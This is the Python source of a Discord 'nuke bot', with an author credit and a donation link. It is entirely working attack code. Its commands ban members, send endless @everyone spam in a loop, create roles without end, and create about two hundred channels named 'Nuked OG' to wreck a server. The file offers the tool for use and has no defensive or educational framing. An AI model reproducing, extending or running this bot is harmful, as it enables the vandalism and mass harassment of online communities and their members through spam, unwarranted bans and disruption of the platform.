#This is a simple nuke bot developed by Ocheanic
#Github - https://github.com/OCHEANIC/Simple-Discord-Nuke-Bot
#Support - https://paypal.me/ocheanicgamerz
#Copyright 2021 - 2022 OCHEANIC


import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
 
 
bot = commands.Bot(command_prefix='n!')
 
client = commands.Bot(command_prefix='n!')
 
 
@bot.event
async def on_ready():
    print("Getting Ready To nuke Servers")
    print(f"Bot Status: Online!...")
 
 
 
@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()
 
 
@bot.command(pass_context=True)
async def spam(ctx): 
    await ctx.message.delete()
    while True:
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
         await ctx.send("Hey @everyone\nServer Nuked \nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\nNuked OhYeh - @everyone\n")
        
 
        
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Noobs")
 
 
 
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    await guild.create_text_channel('Nuked OG')
    
 
 
 
 
bot.run ("AddYrTokenHereKid")
